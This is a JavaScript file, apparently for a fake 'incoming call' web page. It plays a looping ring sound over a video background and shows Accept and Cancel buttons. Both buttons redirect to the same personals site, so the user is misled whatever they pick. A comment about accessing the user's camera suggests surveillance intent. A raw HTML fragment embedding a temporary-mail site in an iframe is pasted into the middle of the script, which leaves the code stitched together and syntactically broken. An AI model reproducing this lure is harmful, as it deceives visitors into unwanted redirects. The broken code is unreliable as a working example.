// Add a stylesheet link dynamically to the document's head
const stylesheetLink = document.createElement('link');
stylesheetLink.rel = 'stylesheet';
stylesheetLink.type = 'text/css';
stylesheetLink.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
document.head.appendChild(stylesheetLink);

// Add custom styles for displaying the full video background and buttons
const styleElement = document.createElement('style');
styleElement.textContent = `
    body {
        margin: 0;
        padding: 0;
        height: 100vh;
        overflow: hidden;
        background-color: black; /* Fallback color */
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: Arial, sans-serif;
        position: relative;
    }

    video {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover; /* Ensure the video covers the screen */
        z-index: -1; /* Send the video to the background */
    }

    .button-container {
        position: absolute;
        bottom: 20px; /* Positioned at the bottom of the screen */
        z-index: 2;
        display: flex;
        justify-content: center;
        width: 100%;
        gap: 20px; /* Space between buttons */
    }

    .accept-button, .bg-red {
        width: 150px;
        height: 50px;
        border-radius: 25px;
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        cursor: pointer;
        color: white;
        transition: opacity 0.3s;
        text-transform: uppercase;
    }

    .accept-button {
        background-color: green;
    }

    .bg-red {
        background-color: red;
    }

    .accept-button:hover, .bg-red:hover {
        opacity: 0.8;
    }

    /* Make it responsive for mobile */
    @media (max-width: 600px) {
        .accept-button, .bg-red {
            width: 120px;
            height: 45px;
            font-size: 16px;
        }
        .button-container {
            top: 47%;
            height: 100%;
        }
    }
`;
document.head.appendChild(styleElement);

// Create a video element for the background
const videoElement = document.createElement('video');
videoElement.setAttribute('autoplay', true);
videoElement.setAttribute('muted', true);
videoElement.setAttribute('playsinline', true);
document.body.appendChild(videoElement);

// Access the user's camera
<style>
    body {
        margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #f4f4f4;
        }
    iframe {
        width: 80%;
    height: 90%;
    border: none;
        }
</style>
</head >
    <body>
        <iframe src="https://temp-mail.org/en/" id="embeddedWebsite"></iframe>
        <script>
        // Logic to replace camera functionality with iframe
            console.log("Website embedded instead of accessing the camera.");
        </script>
    </body>

// Create a container for the buttons
const buttonContainer = document.createElement('div');
buttonContainer.classList.add('button-container');

// Create the "Accept" button
const acceptButton = document.createElement('button');
acceptButton.classList.add('accept-button');
acceptButton.innerText = 'Accept';
acceptButton.addEventListener('click', () => {
    
    setTimeout(function() {
        window.location.href = 'https://megapersonals.eu/';
    }, 2000);
   
});

// Create the "Cancel" button
const cancelButton = document.createElement('button');
cancelButton.classList.add('accept-button', 'bg-red');
cancelButton.innerText = 'Cancel';
cancelButton.addEventListener('click', () => {
    setTimeout(function() {
        window.location.href = 'https://megapersonals.eu/';
    }, 2000);
});

// Append both buttons to the container
buttonContainer.appendChild(acceptButton);
buttonContainer.appendChild(cancelButton);

// Append the button container to the body
document.body.appendChild(buttonContainer);



// Create an audio element for the call sound
const audioElement = document.createElement('audio');
audioElement.src = 'https://res.cloudinary.com/dlzhxryun/video/upload/v1736279310/telephone-ringwav-14674_vwli5a.mp3'; // Replace with your desired sound
audioElement.autoplay = true;
audioElement.loop = true; // You can set loop to true if you want it to play continuously
document.body.appendChild(audioElement);
